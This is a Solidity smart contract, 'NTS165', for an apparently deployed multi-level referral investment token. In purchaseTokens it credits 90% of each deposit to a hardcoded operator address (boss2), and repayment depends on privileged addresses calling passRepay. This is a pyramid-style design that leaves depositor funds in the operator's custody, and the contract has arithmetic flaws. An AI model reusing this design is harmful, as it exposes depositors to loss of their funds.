 

pragma solidity ^0.5.1;

 

contract NTS {
    function fund() external payable;
}

contract NTS165 {
    modifier onlyBagholders {
        require(myTokens() > 0);
        _;
    }

    modifier onlyStronghands {
        require(myDividends(true) > 0);
        _;
    }

    modifier onlyAdmin {
        require(msg.sender == admin);
        _;
    }

    modifier onlyBoss2 {
        require(msg.sender == boss2);
        _;
    }

    string public name = "NTS 165";
    string public symbol = "NTS165";
    address public admin;
    address constant internal boss1 = 0xCa27fF938C760391E76b7aDa887288caF9BF6Ada;
    address constant internal boss2 = 0xf43414ABb5a05c3037910506571e4333E16a4bf4;
    uint8 constant public decimals = 18;
    uint8 constant internal welcomeFee_ = 10;
    uint8 constant internal refLevel1_ = 4;
    uint8 constant internal refLevel2_ = 2;
    uint8 constant internal refLevel3_ = 2;
    uint256 constant internal tokenPrice = 0.001 ether;

    uint256 constant internal magnitude = 2 ** 64;
    uint256 public stakingRequirement = 1 ether;
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) public referralBalance_;
    mapping(address => int256) internal payoutsTo_;
    mapping(address => uint256) public repayBalance_;
    mapping(address => bool) public mayPassRepay;

    uint256 internal tokenSupply_;
    uint256 internal profitPerShare_;
    bool public saleOpen = true;

    NTS constant internal nts81 = NTS(0x897D6c6772B85bf25B46c6F6DA454133478ea6ab);

    constructor() public {
        admin = msg.sender;
        mayPassRepay[boss1] = true;
        mayPassRepay[boss2] = true;
    }

    function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) {
        require(msg.value >= 1 ether, "Minimum deposit of 1 ETH is allowed.");
        require(saleOpen, "Sales stopped for the moment.");
        return purchaseTokens(msg.value, _ref1, _ref2, _ref3);
    }

    function() external payable {
        require(msg.value >= 1 ether, "Minimum deposit of 1 ETH is allowed.");
        require(saleOpen, "Sales stopped for the moment.");
        purchaseTokens(msg.value, address(0x0), address(0x0), address(0x0));
    }

    function reinvest() onlyStronghands public {
        uint256 _dividends = myDividends(false);
        address _customerAddress = msg.sender;
        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
        _dividends += referralBalance_[_customerAddress];
        referralBalance_[_customerAddress] = 0;
        uint256 _tokens = purchaseTokens(_dividends, address(0x0), address(0x0), address(0x0));
        emit OnReinvestment(_customerAddress, _dividends, _tokens, now);
    }

    function exit() public {
        address _customerAddress = msg.sender;
        uint256 _tokens = tokenBalanceLedger_[_customerAddress];
        if (_tokens > 0) getRepay();
        withdraw();
    }

    function withdraw() onlyStronghands public {
        address payable _customerAddress = msg.sender;
        uint256 _dividends = myDividends(false);
        payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);
        _dividends += referralBalance_[_customerAddress];
        referralBalance_[_customerAddress] = 0;
        _customerAddress.transfer(_dividends);
        emit OnWithdraw(_customerAddress, _dividends, now);
    }

    function getRepay() public {
        address payable _customerAddress = msg.sender;
        uint256 balance = repayBalance_[_customerAddress];
        require(balance > 0);
        repayBalance_[_customerAddress] = 0;
        uint256 tokens = tokenBalanceLedger_[_customerAddress];
        tokenBalanceLedger_[_customerAddress] = 0;
        tokenSupply_ = tokenSupply_ - tokens;

        _customerAddress.transfer(balance);
        emit OnGotRepay(_customerAddress, balance, now);
    }

    function myTokens() public view returns (uint256) {
        address _customerAddress = msg.sender;
        return balanceOf(_customerAddress);
    }

    function myDividends(bool _includeReferralBonus) public view returns (uint256) {
        address _customerAddress = msg.sender;
        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
    }
    
    function dividendsByAddress(address _customerAddress, bool _includeReferralBonus) public view returns (uint256) {
        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
    }

    function balanceOf(address _customerAddress) public view returns (uint256) {
        return tokenBalanceLedger_[_customerAddress];
    }

    function dividendsOf(address _customerAddress) public view returns (uint256) {
        return (uint256) ((int256) (profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
    }

    function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) {
        address _customerAddress = msg.sender;

        uint256[5] memory uIntValues = [
            _incomingEthereum * welcomeFee_ / 100,
            0,
            0,
            0,
            0
        ];

        uIntValues[1] = uIntValues[0] * refLevel1_ / welcomeFee_;
        uIntValues[2] = uIntValues[0] * refLevel2_ / welcomeFee_;
        uIntValues[3] = uIntValues[0] * refLevel3_ / welcomeFee_;
        uIntValues[4] = uIntValues[0] * 1 / welcomeFee_;

        uint256 _dividends = uIntValues[0] - uIntValues[1] - uIntValues[2] - uIntValues[3] - uIntValues[4];
        uint256 _taxedEthereum = _incomingEthereum - uIntValues[0];

        uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum);
        uint256 _fee = _dividends * magnitude;

        require(_amountOfTokens > 0);

        if (
            _ref1 != 0x0000000000000000000000000000000000000000 &&
            tokenBalanceLedger_[_ref1] * tokenPrice >= stakingRequirement
        ) {
            referralBalance_[_ref1] += uIntValues[1];
        } else {
            referralBalance_[boss1] += uIntValues[1];
            _ref1 = 0x0000000000000000000000000000000000000000;
        }

        if (
            _ref2 != 0x0000000000000000000000000000000000000000 &&
            tokenBalanceLedger_[_ref2] * tokenPrice >= stakingRequirement
        ) {
            referralBalance_[_ref2] += uIntValues[2];
        } else {
            referralBalance_[boss1] += uIntValues[2];
            _ref2 = 0x0000000000000000000000000000000000000000;
        }

        if (
            _ref3 != 0x0000000000000000000000000000000000000000 &&
            tokenBalanceLedger_[_ref3] * tokenPrice >= stakingRequirement
        ) {
            referralBalance_[_ref3] += uIntValues[3];
        } else {
            referralBalance_[boss1] += uIntValues[3];
            _ref3 = 0x0000000000000000000000000000000000000000;
        }

        referralBalance_[boss2] += _taxedEthereum;

        if (tokenSupply_ > 0) {
            tokenSupply_ += _amountOfTokens;
            profitPerShare_ += (_dividends * magnitude / tokenSupply_);
            _fee = _fee - (_fee - (_amountOfTokens * (_dividends * magnitude / tokenSupply_)));
        } else {
            tokenSupply_ = _amountOfTokens;
        }

        tokenBalanceLedger_[_customerAddress] += _amountOfTokens;
        int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens - _fee);
        payoutsTo_[_customerAddress] += _updatedPayouts;

        nts81.fund.value(uIntValues[4])();

        emit OnTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, now);

        return _amountOfTokens;
    }

    function ethereumToTokens_(uint256 _ethereum) public pure returns (uint256) {
        uint256 _tokensReceived = _ethereum * 1e18 / tokenPrice;

        return _tokensReceived;
    }

    function tokensToEthereum_(uint256 _tokens) public pure returns (uint256) {
        uint256 _etherReceived = _tokens / tokenPrice * 1e18;

        return _etherReceived;
    }

    function fund() public payable {
        uint256 perShare = msg.value * magnitude / tokenSupply_;
        profitPerShare_ += perShare;
        emit OnFunded(msg.sender, msg.value, perShare, now);
    }

     
    function passRepay(address customerAddress) public payable {
        require(mayPassRepay[msg.sender], "Not allowed to pass repay from your address.");
        uint256 value = msg.value;
        require(value > 0);

        repayBalance_[customerAddress] += value;
        emit OnRepayPassed(customerAddress, msg.sender, value, now);
    }

    function allowPassRepay(address payer) public onlyAdmin {
        mayPassRepay[payer] = true;
        emit OnRepayAddressAdded(payer, now);
    }

    function denyPassRepay(address payer) public onlyAdmin {
        mayPassRepay[payer] = false;
        emit OnRepayAddressRemoved(payer, now);
    }

    function passInterest(address customerAddress, uint256 ethRate, uint256 rate) public payable {
        require(mayPassRepay[msg.sender], "Not allowed to pass interest from your address.");
        require(msg.value > 0);

        referralBalance_[customerAddress] += msg.value;

        emit OnInterestPassed(customerAddress, msg.value, ethRate, rate, now);
    }

    function saleStop() public onlyAdmin {
        saleOpen = false;
        emit OnSaleStop(now);
    }

    function saleStart() public onlyAdmin {
        saleOpen = true;
        emit OnSaleStart(now);
    }

    event OnTokenPurchase(
        address indexed customerAddress,
        uint256 incomingEthereum,
        uint256 tokensMinted,
        address ref1,
        address ref2,
        address ref3,
        uint256 timestamp
    );

    event OnReinvestment(
        address indexed customerAddress,
        uint256 ethereumReinvested,
        uint256 tokensMinted,
        uint256 timestamp
    );

    event OnWithdraw(
        address indexed customerAddress,
        uint256 value,
        uint256 timestamp
    );

    event OnGotRepay(
        address indexed customerAddress,
        uint256 value,
        uint256 timestamp
    );

    event OnFunded(
        address indexed source,
        uint256 value,
        uint256 perShare,
        uint256 timestamp
    );

    event OnRepayPassed(
        address indexed customerAddress,
        address indexed payer,
        uint256 value,
        uint256 timestamp
    );

    event OnInterestPassed(
        address indexed customerAddress,
        uint256 value,
        uint256 ethRate,
        uint256 rate,
        uint256 timestamp
    );

    event OnSaleStop(
        uint256 timestamp
    );

    event OnSaleStart(
        uint256 timestamp
    );

    event OnRepayAddressAdded(
        address indexed payer,
        uint256 timestamp
    );

    event OnRepayAddressRemoved(
        address indexed payer,
        uint256 timestamp
    );
}